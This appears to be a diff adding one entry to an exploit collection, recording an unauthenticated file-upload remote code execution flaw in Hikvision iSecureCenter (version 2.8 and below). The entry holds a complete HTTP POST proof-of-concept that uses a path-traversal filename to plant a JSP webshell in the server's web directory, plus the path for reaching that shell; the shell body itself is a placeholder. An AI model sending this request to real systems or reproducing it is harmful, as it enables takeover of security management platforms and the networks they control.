@@ -1,0 +1,8 @@
+vendor = "海康威视"
+name = "海康威视iSecureCenter综合安防管理平台report前台上传命令执行"
+type = "RCE"
+source = "DVB"
+info = "version<=2.8，厂商修复方式太烂，马儿路径/portal/ui/login/..;/..;/new.jsp"
+date = "08.08"
+poc = "POST /svm/api/external/report HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip <%jsp的马%> ------WebKitFormBoundary9PggsiM755PLa54a--"
+label = "nday"
